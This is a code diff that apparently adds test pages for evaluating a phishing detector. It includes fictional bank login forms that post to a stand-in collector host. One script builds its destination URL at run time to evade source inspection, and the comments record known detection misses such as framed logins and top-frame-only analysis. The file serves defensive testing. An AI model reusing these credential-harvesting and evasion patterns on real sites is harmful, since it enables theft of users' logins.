@@ -128,6 +128,61 @@ addEventListener('load', () => {
 </script>""")
 SAMPLE_DOWNLOAD = b"TEST PAGE sample download. Fictional brand, harmless text.\n"
 
+# Evaluation pages. Handlers send a fixed string and nothing is ever submitted.
+ACTION_LOGIN = page("Northwind Bank sign in", """
+<form action="http://collector.test/submit" method="post">
+  <label>User ID <input type="text" name="username"></label><br>
+  <label>Password <input type="password" name="password"></label><br>
+  <button type="submit">Sign in</button>
+</form>""")
+
+# The destination exists only at run time, so reading the handler's source finds nothing. A known miss.
+CONSTRUCTED_LOGIN = page("Northwind Bank sign in", """
+<form id="login">
+  <label>User ID <input type="text" name="username"></label><br>
+  <label>Password <input type="password" name="password"></label><br>
+  <button type="submit">Sign in</button>
+</form>
+<script>
+const parts = ['http:', '', 'collector.test', 'submit'];
+document.getElementById('login').addEventListener('submit', (e) => {
+  e.preventDefault();
+  const to = parts.join('/');
+  fetch(to, {method: 'POST', body: 'test-page-no-data'});
+});
+</script>""")
+
+# The login sits in a frame, and only the top frame is analyzed. A known miss.
+FRAMED_LOGIN = page("Northwind Bank", '<iframe src="/login-action" width="500" height="260"></iframe>')
+
+# Legitimate single sign-on: one customer's two domains, and a third-party identity provider. The second looks exactly
+# like phishing to a rule that only sees a password going to another host. A known false alarm.
+SSO_SAME_CUSTOMER = page("Tailspin sign in", """
+<form action="http://northwind-verify.test/session" method="post">
+  <label>User ID <input type="text" name="username"></label><br>
+  <label>Password <input type="password" name="password"></label><br>
+  <button type="submit">Sign in</button>
+</form>""")
+SSO_THIRD_PARTY = page("Northwind Bank sign in", """
+<form action="http://login.fabrikam-id.test/session" method="post">
+  <label>User ID <input type="text" name="username"></label><br>
+  <label>Password <input type="password" name="password"></label><br>
+  <button type="submit">Sign in</button>
+</form>""")
+
+CONTACT = page("Northwind Bank contact", """
+<form action="/contact-send" method="post">
+  <label>Email <input type="text" name="email"></label><br>
+  <label>Message <input type="text" name="message"></label><br>
+  <button type="submit">Send</button>
+</form>""")
+
+NEWSLETTER = page("Northwind Bank newsletter", """
+<form action="http://collector.test/newsletter" method="post">
+  <label>Email <input type="text" name="email"></label><br>
+  <button type="submit">Subscribe</button>
+</form>""")
+
 BRANCHES = page("Northwind Bank branches", """
 <p>Our fictional branches are open Monday to Friday, 9:00 to 17:00.</p>
 <ul><li>Harbour Street</li><li>Mill Lane</li></ul>""")
@@ -144,6 +199,13 @@ ROUTES = {
     ("tailspin.sites-demo.test", "/login-shared"): SHARED_DOMAIN_LOGIN,
     ("tailspin-offers.test", "/verify-account"): VERIFY_ACCOUNT,
     ("northwind-verify.test", "/containment"): CONTAINMENT,
+    ("northwind-verify.test", "/login-action"): ACTION_LOGIN,
+    ("northwind-verify.test", "/login-constructed"): CONSTRUCTED_LOGIN,
+    ("northwind-verify.test", "/login-frame"): FRAMED_LOGIN,
+    ("tailspin-offers.test", "/sso-login"): SSO_SAME_CUSTOMER,
+    ("northwind-bank.test", "/login-sso"): SSO_THIRD_PARTY,
+    ("northwind-bank.test", "/contact"): CONTACT,
+    ("northwind-bank.test", "/newsletter"): NEWSLETTER,
 }
 
 
